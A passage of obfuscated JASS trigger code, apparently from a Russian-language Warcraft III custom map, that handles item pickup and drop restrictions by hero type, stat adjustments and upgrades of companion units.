local integer g6=GetPlayerId(GetOwningPlayer(hJ))+1
local boolean hH=false
local integer hG
if IsUnitType(hJ,UNIT_TYPE_HERO)==true then
if GetItemUserData(g4)==g6 then
if GetItemTypeId(g4)==$49305847 or GetItemTypeId(g4)==$49305956 or GetItemTypeId(g4)==$49305958 then
set hG=50
set hH=true
elseif GetItemTypeId(g4)==$49305331 or GetItemTypeId(g4)==$49304834 or GetItemTypeId(g4)==$4930525A or GetItemTypeId(g4)==$49304D38 or GetItemTypeId(g4)==$49303048 or GetItemTypeId(g4)==$49305A30 then
set hG=100
set hH=true
elseif GetItemTypeId(g4)==$49305639 or GetItemTypeId(g4)==$49305A38 or GetItemTypeId(g4)==$49304E5A or GetItemTypeId(g4)==$49305A39 or GetItemTypeId(g4)==$49304D34 or GetItemTypeId(g4)==$49305333 or GetItemTypeId(g4)==$49305332 or GetItemTypeId(g4)==$49305638 or GetItemTypeId(g4)==$49304D35 or GetItemTypeId(g4)==$49304D36 or GetItemTypeId(g4)==$49305050 or GetItemTypeId(g4)==$49305053 then
set hG=150
set hH=true
elseif GetItemTypeId(g4)==$49313057 or GetItemTypeId(g4)==$49313134 or GetItemTypeId(g4)==$49313145 or GetItemTypeId(g4)==$49313055 or GetItemTypeId(g4)==$49313141 or GetItemTypeId(g4)==$49313138 or GetItemTypeId(g4)==$49313130 or GetItemTypeId(g4)==$49313132 or GetItemTypeId(g4)==$49313143 or GetItemTypeId(g4)==$49313059 or GetItemTypeId(g4)==$49313136 or GetItemTypeId(g4)==$49313147 then
set hG=250
set hH=true
endif
if hH==true then
if hI[g6]==1 then
call SetHeroStr(hJ,GetHeroStr(hJ,false)-hG,false)
elseif hI[g6]==3 then
call SetHeroInt(hJ,GetHeroInt(hJ,false)-hG,false)
elseif hI[g6]==2 then
call SetHeroAgi(hJ,GetHeroAgi(hJ,false)-hG,false)
endif
endif
endif
endif
set g4=null
set hJ=null
endfunction
function BtO takes nothing returns nothing
local trigger Hc=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Hc,EVENT_PLAYER_UNIT_DROP_ITEM)
call TriggerAddAction(Hc,function BtN)
set Hc=null
endfunction
function BtP takes nothing returns boolean
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$5530304B then
return true
endif
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$55303133 then
return true
endif
return false
endfunction
function BtQ takes nothing returns boolean
if not BtP() then
return false
endif
return true
endfunction
function BtR takes nothing returns boolean
if not (GetItemLevel(GetManipulatedItem())==11) then
return false
endif
return true
endfunction
function BtS takes nothing returns boolean
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$4F303036 then
return true
endif
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$4F303052 then
return true
endif
return false
endfunction
function BtT takes nothing returns boolean
if not BtS() then
return false
endif
return true
endfunction
function BtU takes nothing returns boolean
if not (GetItemLevel(GetManipulatedItem())==12) then
return false
endif
return true
endfunction
function BtV takes nothing returns boolean
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$4F303034 then
return true
endif
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$4F30304A then
return true
endif
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$4F303053 then
return true
endif
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$4F303055 then
return true
endif
return false
endfunction
function BtW takes nothing returns boolean
if not BtV() then
return false
endif
return true
endfunction
function BtX takes nothing returns boolean
if not (GetItemLevel(GetManipulatedItem())==13) then
return false
endif
return true
endfunction
function BtY takes nothing returns boolean
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$48303147 then
return true
endif
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$48303656 then
return true
endif
return false
endfunction
function BtZ takes nothing returns boolean
if not BtY() then
return false
endif
return true
endfunction
function Bta takes nothing returns boolean
if not (GetItemLevel(GetManipulatedItem())==14) then
return false
endif
return true
endfunction
function Btb takes nothing returns boolean
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$48303131 then
return true
endif
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$48303652 then
return true
endif
return false
endfunction
function Btc takes nothing returns boolean
if not Btb() then
return false
endif
return true
endfunction
function Btd takes nothing returns boolean
if not (GetItemLevel(GetManipulatedItem())==15) then
return false
endif
return true
endfunction
function Bte takes nothing returns boolean
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$4F303032 then
return true
endif
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$4F303054 then
return true
endif
return false
endfunction
function Btf takes nothing returns boolean
if not Bte() then
return false
endif
return true
endfunction
function Btg takes nothing returns boolean
if not (GetItemLevel(GetManipulatedItem())==16) then
return false
endif
return true
endfunction
function Bth takes nothing returns boolean
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$48303058 then
return true
endif
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$48303651 then
return true
endif
return false
endfunction
function Bti takes nothing returns boolean
if not Bth() then
return false
endif
return true
endfunction
function Btj takes nothing returns boolean
if not (GetItemLevel(GetManipulatedItem())==17) then
return false
endif
return true
endfunction
function Btk takes nothing returns boolean
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$45303057 then
return true
endif
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$45303133 then
return true
endif
return false
endfunction
function Btl takes nothing returns boolean
if not Btk() then
return false
endif
return true
endfunction
function Btm takes nothing returns boolean
if not (GetItemLevel(GetManipulatedItem())==18) then
return false
endif
return true
endfunction
function Btn takes nothing returns boolean
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$4830304C then
return true
endif
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$48303659 then
return true
endif
return false
endfunction
function Bto takes nothing returns boolean
if not Btn() then
return false
endif
return true
endfunction
function Btp takes nothing returns boolean
if not (GetItemLevel(GetManipulatedItem())==19) then
return false
endif
return true
endfunction
function Btq takes nothing returns boolean
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$48303034 then
return true
endif
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$4830364E then
return true
endif
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$48303733 then
return true
endif
return false
endfunction
function Btr takes nothing returns boolean
if not Btq() then
return false
endif
return true
endfunction
function Bts takes nothing returns boolean
if not (GetItemLevel(GetManipulatedItem())==20) then
return false
endif
return true
endfunction
function Btt takes nothing returns boolean
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$48303046 then
return true
endif
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$48303653 then
return true
endif
return false
endfunction
function Btu takes nothing returns boolean
if not Btt() then
return false
endif
return true
endfunction
function Btv takes nothing returns boolean
if not (GetItemLevel(GetManipulatedItem())==21) then
return false
endif
return true
endfunction
function Btw takes nothing returns boolean
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$45303033 then
return true
endif
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$45303055 then
return true
endif
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$4530304B then
return true
endif
return false
endfunction
function Btx takes nothing returns boolean
if not Btw() then
return false
endif
return true
endfunction
function Bty takes nothing returns boolean
if not (GetItemLevel(GetManipulatedItem())==22) then
return false
endif
return true
endfunction
function Btz takes nothing returns boolean
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$4F303030 then
return true
endif
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$4F303051 then
return true
endif
return false
endfunction
function Bt0 takes nothing returns boolean
if not Btz() then
return false
endif
return true
endfunction
function Bt1 takes nothing returns boolean
if not (GetItemLevel(GetManipulatedItem())==23) then
return false
endif
return true
endfunction
function Bt2 takes nothing returns boolean
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$48303033 then
return true
endif
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$4830344A then
return true
endif
return false
endfunction
function Bt3 takes nothing returns boolean
if not Bt2() then
return false
endif
return true
endfunction
function Bt4 takes nothing returns boolean
if not (GetItemLevel(GetManipulatedItem())==24) then
return false
endif
return true
endfunction
function Bt5 takes nothing returns boolean
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$48303036 then
return true
endif
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$4830364F then
return true
endif
return false
endfunction
function Bt6 takes nothing returns boolean
if not Bt5() then
return false
endif
return true
endfunction
function Bt7 takes nothing returns boolean
if not (GetItemLevel(GetManipulatedItem())==25) then
return false
endif
return true
endfunction
function Bt8 takes nothing returns boolean
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$48303032 then
return true
endif
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$48303655 then
return true
endif
return false
endfunction
function Bt9 takes nothing returns boolean
if not Bt8() then
return false
endif
return true
endfunction
function BuB takes nothing returns boolean
if not (GetItemLevel(GetManipulatedItem())==26) then
return false
endif
return true
endfunction
function BuC takes nothing returns boolean
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$48303031 then
return true
endif
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$48303650 then
return true
endif
return false
endfunction
function BuD takes nothing returns boolean
if not BuC() then
return false
endif
return true
endfunction
function BuE takes nothing returns boolean
if not (GetItemLevel(GetManipulatedItem())==27) then
return false
endif
return true
endfunction
function BuF takes nothing returns boolean
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$48303259 then
return true
endif
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$48303736 then
return true
endif
return false
endfunction
function BuG takes nothing returns boolean
if not BuF() then
return false
endif
return true
endfunction
function BuH takes nothing returns boolean
if not (GetItemLevel(GetManipulatedItem())==28) then
return false
endif
return true
endfunction
function BuI takes nothing returns boolean
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$48303344 then
return true
endif
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$48303657 then
return true
endif
return false
endfunction
function BuJ takes nothing returns boolean
if not BuI() then
return false
endif
return true
endfunction
function BuK takes nothing returns boolean
if not (GetItemLevel(GetManipulatedItem())==29) then
return false
endif
return true
endfunction
function BuL takes nothing returns boolean
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$48303356 then
return true
endif
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$48303532 then
return true
endif
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$48303744 then
return true
endif
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$48303748 then
return true
endif
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$48303749 then
return true
endif
return false
endfunction
function BuM takes nothing returns boolean
if not BuL() then
return false
endif
return true
endfunction
function BuN takes nothing returns boolean
if not (GetItemLevel(GetManipulatedItem())==30) then
return false
endif
return true
endfunction
function BuO takes nothing returns boolean
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$4830314B then
return true
endif
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$48303735 then
return true
endif
return false
endfunction
function BuP takes nothing returns boolean
if not BuO() then
return false
endif
return true
endfunction
function BuQ takes nothing returns boolean
if not (GetItemLevel(GetManipulatedItem())==32) then
return false
endif
return true
endfunction
function BuR takes nothing returns boolean
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$48303443 then
return true
endif
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$48303654 then
return true
endif
return false
endfunction
function BuS takes nothing returns boolean
if not BuR() then
return false
endif
return true
endfunction
function BuT takes nothing returns boolean
if not (GetItemLevel(GetManipulatedItem())==31) then
return false
endif
return true
endfunction
function BuU takes nothing returns boolean
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$48303353 then
return true
endif
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$48303734 then
return true
endif
return false
endfunction
function BuV takes nothing returns boolean
if not BuU() then
return false
endif
return true
endfunction
function BuW takes nothing returns boolean
if not (GetItemLevel(GetManipulatedItem())==33) then
return false
endif
return true
endfunction
function BuX takes nothing returns boolean
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$48303534 then
return true
endif
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$48303738 then
return true
endif
return false
endfunction
function BuY takes nothing returns boolean
if not BuX() then
return false
endif
return true
endfunction
function BuZ takes nothing returns boolean
if not (GetItemLevel(GetManipulatedItem())==34) then
return false
endif
return true
endfunction
function Bua takes nothing returns boolean
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$48303550 then
return true
endif
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$48303730 then
return true
endif
return false
endfunction
function Bub takes nothing returns boolean
if not Bua() then
return false
endif
return true
endfunction
function Buc takes nothing returns boolean
if not (GetItemLevel(GetManipulatedItem())==35) then
return false
endif
return true
endfunction
function Bud takes nothing returns boolean
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$48303437 then
return true
endif
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$48303737 then
return true
endif
return false
endfunction
function Bue takes nothing returns boolean
if not Bud() then
return false
endif
return true
endfunction
function Buf takes nothing returns boolean
if not (GetItemLevel(GetManipulatedItem())==36) then
return false
endif
return true
endfunction
function Bug takes nothing returns boolean
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$48303030 then
return true
endif
return false
endfunction
function Buh takes nothing returns boolean
if not Bug() then
return false
endif
return true
endfunction
function Bui takes nothing returns boolean
if not (GetItemLevel(GetManipulatedItem())==37) then
return false
endif
return true
endfunction
function Buj takes nothing returns boolean
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$4830354D then
return true
endif
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$4830374F then
return true
endif
return false
endfunction
function Buk takes nothing returns boolean
if not Buj() then
return false
endif
return true
endfunction
function Bul takes nothing returns boolean
if not (GetItemLevel(GetManipulatedItem())==38) then
return false
endif
return true
endfunction
function Bum takes nothing returns boolean
if GetUnitTypeId(MT[GetPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$4F303049 then
return true
endif
return false
endfunction
function Bun takes nothing returns boolean
if not Bum() then
return false
endif
return true
endfunction
function Buo takes nothing returns boolean
if not (GetItemLevel(GetManipulatedItem())==39) then
return false
endif
return true
endfunction
function Bup takes nothing returns nothing
local unit g5=GetTriggerUnit()
local item g4=GetManipulatedItem()
if BtR() then
if BtQ() then
else
call UnitRemoveItem(g5,g4)
call ne(g5,"Не твоё!!!",.023,255,0,0)
endif
endif
if BtU() then
if BtT() then
else
call UnitRemoveItem(g5,g4)
call ne(g5,"Не твоё!!!",.023,255,0,0)
endif
endif
if BtX() then
if BtW() then
else
call UnitRemoveItem(g5,g4)
call ne(g5,"Не твоё!!!",.023,255,0,0)
endif
endif
if Bta() then
if BtZ() then
else
call UnitRemoveItem(g5,g4)
call ne(g5,"Не твоё!!!",.023,255,0,0)
endif
endif
if Btd() then
if Btc() then
else
call UnitRemoveItem(g5,g4)
call ne(g5,"Не твоё!!!",.023,255,0,0)
endif
endif
if Btg() then
if Btf() then
else
call UnitRemoveItem(g5,g4)
call ne(g5,"Не твоё!!!",.023,255,0,0)
endif
endif
if Btj() then
if Bti() then
else
call UnitRemoveItem(g5,g4)
call ne(g5,"Не твоё!!!",.023,255,0,0)
endif
endif
if Btm() then
if Btl() then
else
call UnitRemoveItem(g5,g4)
call ne(g5,"Не твоё!!!",.023,255,0,0)
endif
endif
if Btp() then
if Bto() then
else
call UnitRemoveItem(g5,g4)
call ne(g5,"Не твоё!!!",.023,255,0,0)
endif
endif
if Bts() then
if Btr() then
else
call UnitRemoveItem(g5,g4)
call ne(g5,"Не твоё!!!",.023,255,0,0)
endif
endif
if Btv() then
if Btu() then
else
call UnitRemoveItem(g5,g4)
call ne(g5,"Не твоё!!!",.023,255,0,0)
endif
endif
if Bty() then
if Btx() then
else
call UnitRemoveItem(g5,g4)
call ne(g5,"Не твоё!!!",.023,255,0,0)
endif
endif
if Bt1() then
if Bt0() then
else
call UnitRemoveItem(g5,g4)
call ne(g5,"Не твоё!!!",.023,255,0,0)
endif
endif
if Bt4() then
if Bt3() then
else
call UnitRemoveItem(g5,g4)
call ne(g5,"Не твоё!!!",.023,255,0,0)
endif
endif
if Bt7() then
if Bt6() then
else
call UnitRemoveItem(g5,g4)
call ne(g5,"Не твоё!!!",.023,255,0,0)
endif
endif
if BuB() then
if Bt9() then
else
call UnitRemoveItem(g5,g4)
call ne(g5,"Не твоё!!!",.023,255,0,0)
endif
endif
if BuE() then
if BuD() then
else
call UnitRemoveItem(g5,g4)
call ne(g5,"Не твоё!!!",.023,255,0,0)
endif
endif
if BuH() then
if BuG() then
else
call UnitRemoveItem(g5,g4)
call ne(g5,"Не твоё!!!",.023,255,0,0)
endif
endif
if BuK() then
if BuJ() then
else
call UnitRemoveItem(g5,g4)
call ne(g5,"Не твоё!!!",.023,255,0,0)
endif
endif
if BuN() then
if BuM() then
else
call UnitRemoveItem(g5,g4)
call ne(g5,"Не твоё!!!",.023,255,0,0)
endif
endif
if BuQ() then
if BuP() then
else
call UnitRemoveItem(g5,g4)
call ne(g5,"Не твоё!!!",.023,255,0,0)
endif
endif
if BuT() then
if BuS() then
else
call UnitRemoveItem(g5,g4)
call ne(g5,"Не твоё!!!",.023,255,0,0)
endif
endif
if BuW() then
if BuV() then
else
call UnitRemoveItem(g5,g4)
call ne(g5,"Не твоё!!!",.023,255,0,0)
endif
endif
if BuZ() then
if BuY() then
else
call UnitRemoveItem(g5,g4)
call ne(g5,"Не твоё!!!",.023,255,0,0)
endif
endif
if Buc() then
if Bub() then
else
call UnitRemoveItem(g5,g4)
call ne(g5,"Не твоё!!!",.023,255,0,0)
endif
endif
if Buf() then
if Bue() then
else
call UnitRemoveItem(g5,g4)
call ne(g5,"Не твоё!!!",.023,255,0,0)
endif
endif
if Bui() then
if Buh() then
else
call UnitRemoveItem(g5,g4)
call ne(g5,"Не твоё!!!",.023,255,0,0)
endif
endif
if Bul() then
if Buk() then
else
call UnitRemoveItem(g5,g4)
call ne(g5,"Не твоё!!!",.023,255,0,0)
endif
endif
if Buo() then
if Bun() then
else
call UnitRemoveItem(g5,g4)
call ne(g5,"Не твоё!!!",.023,255,0,0)
endif
endif
if GetItemTypeId(g4)==$49305039 and GetUnitTypeId(g5)==$4830354D then
call UnitRemoveItem(g5,g4)
call ne(g5,"Ты же смерть! Какая жизнь?",.023,255,0,0)
endif
set g5=null
set g4=null
endfunction
function Buq takes nothing returns nothing
set hK=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(hK,EVENT_PLAYER_UNIT_PICKUP_ITEM)
call TriggerAddAction(hK,function Bup)
endfunction
function Bur takes nothing returns nothing
local item MO=GetManipulatedItem()
local unit Hu=GetTriggerUnit()
local boolean Nm=false
local integer Ma=GetPlayerId(GetOwningPlayer(Hu))
local integer L9=1
loop
set hM[L9]=GetItemTypeId(UnitItemInSlot(NL[2*(Ma+1)],L9-1))
set L9=L9+1
exitwhen L9>6
endloop
if GetItemTypeId(MO)==$49305846 then
if GetUnitTypeId(NL[2*(GetPlayerId(GetOwningPlayer(Hu))+1)])==$6E303835 or GetUnitTypeId(NL[2*(GetPlayerId(GetOwningPlayer(Hu))+1)])==$6E303834 or GetUnitTypeId(NL[2*(GetPlayerId(GetOwningPlayer(Hu))+1)])==$6E303833 then
set Nm=true
call RemoveUnit(NL[2*(Ma+1)])
call UnitAddAbility(MT[Ma],$4131374F)
call UnitAddAbility(MT[Ma],$41303458)
call UnitAddAbility(MT[Ma],$41305050)
call ni(Hu,0,0,0,0,0,0,"+100 стат, 4000 МР, 450 атк, 70 зщ.",100,100,100)
set NL[2*(GetPlayerId(GetOwningPlayer(Hu))+1)]=CreateUnit(Player(GetPlayerId(GetOwningPlayer(Hu))),$6E30384B,GetUnitX(Hu),GetUnitY(Hu),0.)
endif
elseif GetItemTypeId(MO)==$49305452 then
set Nm=true
call RemoveUnit(NL[2*(Ma+1)])
set hP[GetPlayerId(GetOwningPlayer(Hu))+1]="+2000 МР"
call UnitAddAbility(MT[Ma],$4131374F)
set NL[2*(GetPlayerId(GetOwningPlayer(Hu))+1)]=CreateUnit(Player(GetPlayerId(GetOwningPlayer(Hu))),$6E303832,GetUnitX(Hu),GetUnitY(Hu),0.)
elseif GetItemTypeId(MO)==$49305450 then
set Nm=true
call RemoveUnit(NL[2*(Ma+1)])
set hP[GetPlayerId(GetOwningPlayer(Hu))+1]="+35 защиты"
call UnitAddAbility(MT[Ma],$4131374E)
set NL[2*(GetPlayerId(GetOwningPlayer(Hu))+1)]=CreateUnit(Player(GetPlayerId(GetOwningPlayer(Hu))),$6E303830,GetUnitX(Hu),GetUnitY(Hu),0.)
elseif GetItemTypeId(MO)==$49305451 then
set Nm=true
call RemoveUnit(NL[2*(Ma+1)])
set hP[GetPlayerId(GetOwningPlayer(Hu))+1]="+200 атаки"
call UnitAddAbility(MT[Ma],$4131374D)
set NL[2*(GetPlayerId(GetOwningPlayer(Hu))+1)]=CreateUnit(Player(GetPlayerId(GetOwningPlayer(Hu))),$6E303831,GetUnitX(Hu),GetUnitY(Hu),0.)
elseif GetItemTypeId(MO)==$4930544F then
if GetUnitTypeId(NL[2*(GetPlayerId(GetOwningPlayer(Hu))+1)])==$6E303533 then
set Nm=true
call RemoveUnit(NL[2*(Ma+1)])
call ni(Hu,.03,.03,.03,.03,.03,3,"+200 стат, 3% Экстрактов",200,200,200)
set NL[2*(GetPlayerId(GetOwningPlayer(Hu))+1)]=CreateUnit(Player(GetPlayerId(GetOwningPlayer(Hu))),$6E303746,GetUnitX(Hu),GetUnitY(Hu),0.)
endif
elseif GetItemTypeId(MO)==$4930504F then
if GetUnitTypeId(NL[2*(GetPlayerId(GetOwningPlayer(Hu))+1)])==$6E303746 then
set Nm=true
call ni(Hu,0,0,0,.04,.04,0,"+300 разума, 4% Магии, Жизни",0,0,300)
call RemoveUnit(NL[2*(Ma+1)])
set NL[2*(GetPlayerId(GetOwningPlayer(Hu))+1)]=CreateUnit(Player(GetPlayerId(GetOwningPlayer(Hu))),$6E303743,GetUnitX(Hu),GetUnitY(Hu),0.)
endif
elseif GetItemTypeId(MO)==$49305051 then
if GetUnitTypeId(NL[2*(GetPlayerId(GetOwningPlayer(Hu))+1)])==$6E303746 then
set Nm=true
call ni(Hu,0,0,.05,0,0,0,"+300 ловкости, 5% Разрушения",0,300,0)
call RemoveUnit(NL[2*(Ma+1)])
set NL[2*(GetPlayerId(GetOwningPlayer(Hu))+1)]=CreateUnit(Player(GetPlayerId(GetOwningPlayer(Hu))),$6E303742,GetUnitX(Hu),GetUnitY(Hu),0.)
endif
elseif GetItemTypeId(MO)==$49305052 then
if GetUnitTypeId(NL[2*(GetPlayerId(GetOwningPlayer(Hu))+1)])==$6E303746 then
set Nm=true
call ni(Hu,.04,.04,0,0,0,0,"+300 силы, 4% Силы, Защиты",300,0,0)
call RemoveUnit(NL[2*(Ma+1)])
set NL[2*(GetPlayerId(GetOwningPlayer(Hu))+1)]=CreateUnit(Player(GetPlayerId(GetOwningPlayer(Hu))),$6E303741,GetUnitX(Hu),GetUnitY(Hu),0.)
endif
elseif GetItemTypeId(MO)==$49304832 then
if GetUnitTypeId(NL[2*(GetPlayerId(GetOwningPlayer(Hu))+1)])==$6E303532 then
set Nm=true
call ni(Hu,0,0,0,0,0,0,"+120 стат",120,120,120)
call RemoveUnit(NL[2*(Ma+1)])
set NL[2*(GetPlayerId(GetOwningPlayer(Hu))+1)]=CreateUnit(Player(GetPlayerId(GetOwningPlayer(Hu))),$6E303533,GetUnitX(Hu),GetUnitY(Hu),0.)
endif
elseif GetItemTypeId(MO)==$49304753 and IsUnitType(Hu,UNIT_TYPE_HERO)==true then
set Nm=true
call ni(Hu,0,0,0,0,0,0,"+50 стат",50,50,50)
call RemoveUnit(NL[2*(Ma+1)])
set NL[2*(GetPlayerId(GetOwningPlayer(Hu))+1)]=CreateUnit(Player(GetPlayerId(GetOwningPlayer(Hu))),$6E303531,GetUnitX(Hu),GetUnitY(Hu),0.)
elseif GetItemTypeId(MO)==$49305458 then
if GetUnitTypeId(NL[2*(GetPlayerId(GetOwningPlayer(Hu))+1)])==$6E303830 then
set Nm=true
call RemoveUnit(NL[2*(Ma+1)])
set hP[GetPlayerId(GetOwningPlayer(Hu))+1]="+70 защиты"
call UnitAddAbility(MT[Ma],$41303458)
set NL[2*(GetPlayerId(GetOwningPlayer(Hu))+1)]=CreateUnit(Player(GetPlayerId(GetOwningPlayer(Hu))),$6E303834,GetUnitX(Hu),GetUnitY(Hu),0.)
endif
elseif GetItemTypeId(MO)==$49305459 then
if GetUnitTypeId(NL[2*(GetPlayerId(GetOwningPlayer(Hu))+1)])==$6E303831 then
set Nm=true
call RemoveUnit(NL[2*(Ma+1)])
set hP[GetPlayerId(GetOwningPlayer(Hu))+1]="+450 атаки"
call UnitAddAbility(MT[Ma],$41305050)
set NL[2*(GetPlayerId(GetOwningPlayer(Hu))+1)]=CreateUnit(Player(GetPlayerId(GetOwningPlayer(Hu))),$6E303833,GetUnitX(Hu),GetUnitY(Hu),0.)
endif
elseif GetItemTypeId(MO)==$4930545A then
if GetUnitTypeId(NL[2*(GetPlayerId(GetOwningPlayer(Hu))+1)])==$6E303832 then
set Nm=true
call RemoveUnit(NL[2*(Ma+1)])
set hP[GetPlayerId(GetOwningPlayer(Hu))+1]="+4000 МР"
call UnitAddAbility(MT[Ma],$41304F57)
set NL[2*(GetPlayerId(GetOwningPlayer(Hu))+1)]=CreateUnit(Player(GetPlayerId(GetOwningPlayer(Hu))),$6E303835,GetUnitX(Hu),GetUnitY(Hu),0.)
endif
elseif GetItemTypeId(MO)==$49304830 then
if GetUnitTypeId(NL[2*(GetPlayerId(GetOwningPlayer(Hu))+1)])==$6E303531 then
call RemoveUnit(NL[2*(Ma+1)])
set Nm=true
call ni(Hu,0,0,0,0,0,0,"+50 стат, +2000 НР, МР",50,50,50)
call UnitAddAbility(MT[Ma],$41304339)
call UnitAddAbility(MT[Ma],$41304337)
set NL[2*(GetPlayerId(GetOwningPlayer(Hu))+1)]=CreateUnit(Player(GetPlayerId(GetOwningPlayer(Hu))),$6E303532,GetUnitX(Hu),GetUnitY(Hu),0.)
endif
elseif GetItemTypeId(MO)==$49305855 then
if GetUnitTypeId(NL[2*(GetPlayerId(GetOwningPlayer(Hu))+1)])==$6E30384B then
call RemoveUnit(NL[2*(Ma+1)])
set Nm=true
call ni(Hu,.06,.06,.06,.06,.06,6,"+200 стат, 6% Экстрактов",200,200,200)
set NL[2*(GetPlayerId(GetOwningPlayer(Hu))+1)]=CreateUnit(Player(GetPlayerId(GetOwningPlayer(Hu))),$6E30384D,GetUnitX(Hu),GetUnitY(Hu),0.)
endif
elseif GetItemTypeId(MO)==$49305856 then
if GetUnitTypeId(NL[2*(GetPlayerId(GetOwningPlayer(Hu))+1)])==$6E30384D then
call RemoveUnit(NL[2*(Ma+1)])
set Nm=true
call ni(Hu,.08,.08,.08,.08,.08,8,"+250 стат, 8% Экстрактов",250,250,250)
set NL[2*(GetPlayerId(GetOwningPlayer(Hu))+1)]=CreateUnit(Player(GetPlayerId(GetOwningPlayer(Hu))),$6E30384E,GetUnitX(Hu),GetUnitY(Hu),0.)
endif
elseif GetItemTypeId(MO)==$49305857 then
if GetUnitTypeId(NL[2*(GetPlayerId(GetOwningPlayer(Hu))+1)])==$6E30384E then
call RemoveUnit(NL[2*(Ma+1)])
set Nm=true
call ni(Hu,.11,.11,.11,.11,.11,11,"+300 стат, 11% Экстрактов",300,300,300)
set NL[2*(GetPlayerId(GetOwningPlayer(Hu))+1)]=CreateUnit(Player(GetPlayerId(GetOwningPlayer(Hu))),$6E30384F,GetUnitX(Hu),GetUnitY(Hu),0.)
endif
elseif GetItemTypeId(MO)==$6667756E then
